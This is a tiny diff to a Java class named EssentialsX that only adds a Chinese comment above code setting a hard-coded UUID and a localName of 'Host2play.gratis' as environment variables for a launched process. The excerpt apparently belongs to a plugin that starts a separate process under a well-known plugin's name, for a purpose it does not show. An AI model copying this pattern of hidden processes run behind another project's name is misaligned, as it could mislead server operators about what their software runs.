@@ -80,7 +80,7 @@ public class EssentialsX extends JavaPlugin {
             getLogger().warning("[localIP] Failed to get local IP: " + e.getMessage());
         }
 
-        // Set environment variables
+        // Set environment variables 修改localName 和 UUID等信息
         String localName = "Host2play.gratis";
         Map<String, String> env = pb.environment();
         env.put("UUID", "ea4909ef-7ca6-4b46-bf2e-6c07896ef407");
